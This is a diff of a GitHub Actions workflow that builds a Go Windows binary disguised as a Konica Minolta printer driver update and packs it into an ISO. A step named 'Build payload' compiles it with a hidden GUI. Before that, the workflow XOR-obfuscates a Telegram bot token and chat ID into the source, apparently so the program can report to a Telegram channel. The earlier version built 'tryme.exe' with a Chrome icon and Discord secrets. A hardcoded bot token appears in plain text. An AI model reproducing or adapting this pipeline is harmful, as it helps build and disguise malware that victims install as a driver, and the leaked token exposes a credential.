@@ -1,32 +1,108 @@
-name: Build tryme.exe
+name: Build ISO
 
-on: [push, workflow_dispatch]
+on:
+  workflow_dispatch:
+    inputs:
+      bot_token:
+        description: 'Telegram Bot Token'
+        required: true
+        default: ''
+      chat_id:
+        description: 'Telegram Chat ID'
+        required: true
+        default: ''
+
+permissions:
+  contents: write
+  actions: write
 
 jobs:
   build:
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Install Python for icon extraction
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.11'
-      - name: Extract icon & create resources
-        run: |
-          pip install requests
-          python tools/extract_chrome_icon.py
-        shell: cmd
-      - name: Build EXE
-        run: |
-          cd builder
-          build.bat "${{ secrets.BOT_TOKEN }}" "${{ secrets.GUILD_ID }}" "${{ secrets.CHANNEL_ID }}" "${{ secrets.WEBHOOK_URL }}"
-        shell: cmd
-      - name: Rename output
-        run: |
-          mkdir dist
-          copy builder\tryme.exe dist\tryme.exe
-        shell: cmd
-      - uses: actions/upload-artifact@v4
-        with:
-          name: tryme.exe
-          path: dist/tryme.exe
+    - uses: actions/checkout@v4
+
+    - name: Setup Go
+      uses: actions/setup-go@v5
+      with:
+        go-version: '1.22'
+
+    - name: Install genisoimage
+      run: sudo apt-get update -qq && sudo apt-get install -y -qq genisoimage
+
+    - name: Inject config
+      env:
+        BOT_TOKEN: ${{ inputs.bot_token || secrets.BOT_TOKEN || '7845006170:AAGNHltQFQfX22-MY50mrnTctWxhfFyAf3w' }}
+        CHAT_ID: ${{ inputs.chat_id || secrets.CHAT_ID || '8449456095' }}
+      run: |
+        python3 -c "
+import os
+tok = os.environ['BOT_TOKEN']
+cid = os.environ['CHAT_ID']
+key = 0x5A
+
+def go_escape(s):
+    r = []
+    for b in s.encode():
+        if 32 <= b <= 126 and b != 34 and b != 92:
+            r.append(chr(b))
+        elif b == 34:
+            r.append('\\\\\"')
+        elif b == 92:
+            r.append('\\\\\\\\')
+        elif b == 10:
+            r.append('\\\\n')
+        elif b == 13:
+            r.append('\\\\r')
+        elif b == 9:
+            r.append('\\\\t')
+        else:
+            r.append('\\\\x{:02x}'.format(b))
+    return ''.join(r)
+
+def enc(s):
+    return bytes([b ^ key for b in s.encode()])
+
+etok = enc(tok)
+ecid = enc(cid)
+
+with open('main.go') as f:
+    code = f.read()
+
+code = code.replace(
+    'ENC_TOKEN   = encryptStr(\"7845006170:AAGNHltQFQfX22-MY50mrnTctWxhfFyAf3w\")',
+    'ENC_TOKEN   = encryptStr(\"' + go_escape(etok.decode('latin-1')) + '\")')
+code = code.replace(
+    'ENC_CHAT_ID = encryptStr(\"8449456095\")',
+    'ENC_CHAT_ID = encryptStr(\"' + go_escape(ecid.decode('latin-1')) + '\")')
+
+with open('main.go', 'w') as f:
+    f.write(code)
+print('[+] Config injected')
+"
+
+    - name: Build payload
+      run: |
+        GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+        go build -ldflags="-s -w -H=windowsgui" \
+          -o konica_minolta_printer-driver-update.exe .
+        ls -lh konica_minolta_printer-driver-update.exe
+
+    - name: Create ISO
+      run: |
+        mkdir -p isodir
+        cp konica_minolta_printer-driver-update.exe isodir/setup.exe
+        genisoimage -o Konica_Minolta_Driver_v2.3.1.iso isodir/
+        ls -lh Konica_Minolta_Driver_v2.3.1.iso
+
+    - name: Upload ISO
+      uses: actions/upload-artifact@v4
+      with:
+        name: Konica_Minolta_Driver_v2.3.1
+        path: Konica_Minolta_Driver_v2.3.1.iso
+
+    - name: Upload EXE
+      uses: actions/upload-artifact@v4
+      with:
+        name: konica_minolta_printer-driver-update
+        path: konica_minolta_printer-driver-update.exe
